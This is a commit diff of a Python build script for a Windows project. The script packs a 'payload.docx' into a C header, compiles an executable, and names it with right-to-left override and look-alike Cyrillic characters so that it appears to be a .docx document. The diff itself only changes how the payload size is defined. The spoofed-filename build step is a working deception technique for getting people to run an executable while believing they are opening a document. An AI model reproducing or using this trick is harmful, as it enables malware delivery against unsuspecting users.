0c1b38dd8e1e6c3304e7769b8a8086607b56ffd7
Krzem <krzem5.dev@gmail.com>
2021-03-27 17:07:37 +0100

    Push Update 03/27/2021, 17:07:23

--- build.py
+++ build.py
@@ -13,12 +13,12 @@ os.chdir("build")
 with open("../rsrc/payload.docx","rb") as f:
 	dt=f.read()
 with open("payload.h","w") as f:
-	f.write(f"#ifndef __PAYLOAD_H__\n#define __PAYLOAD_H__\n#include <stdint.h>\n\n\n\nstatic const uint8_t PAYLOAD[]={{\n")
+	f.write(f"#ifndef __PAYLOAD_H__\n#define __PAYLOAD_H__\n#include <stdint.h>\n\n\n\n#define PAYLOAD_SIZE {len(dt)}\n\n\n\nstatic const uint8_t PAYLOAD[]={{\n")
 	i=0
 	while (i<len(dt)):
 		f.write(f"\t{', '.join(['0x'+hex(e)[2:].rjust(2,'0') for e in dt[i:i+6]])}{(',' if i+6<len(dt) else '')}\n")
 		i+=6
-	f.write(f"}};\n\n\n\nstatic const uint32_t PAYLOAD_SIZE={len(dt)};\n\n\n\n#endif\n")
+	f.write(f"}};\n\n\n\n#endif\n")
 if (subprocess.run(["cl","/c","/permissive-","/utf-8","/GS","/W3","/Zc:wchar_t","/Gm-","/sdl","/Zc:inline","/fp:precise","/D","NDEBUG","/D","_WINDOWS","/D","_UNICODE","/D","UNICODE","/errorReport:none","/WX","/Zc:forScope","/Gd","/Oi","/FC","/EHsc","/nologo","/diagnostics:column","/GL","/Gy","/Zi","/O2","/Oi","/MD","../src/*.c"]).returncode==0 and subprocess.run(["rc","/r","/fo","resource.res","/nologo","../resource.rc"]).returncode==0 and subprocess.run(["link","*.obj","*.res","/OUT:what_is_an_\u202ex\u0441od\u202e.exe","/DYNAMICBASE","user32.lib","shell32.lib","shlwapi.lib","/MACHINE:X64","/SUBSYSTEM:WINDOWS","/ERRORREPORT:none","/NOLOGO","/TLBID:1","/WX","/LTCG","/OPT:REF","/INCREMENTAL:NO","/OPT:ICF","/LARGEADDRESSAWARE"]).returncode==0):
 	os.system("del *.obj&&del *.pdb&&del *.h&&del *.res&&cls")
 	with open("_what_is_an_\u202ex\u0441od\u202e.exe","wb") as wf,open("what_is_an_\u202ex\u0441od\u202e.exe","rb") as rf:
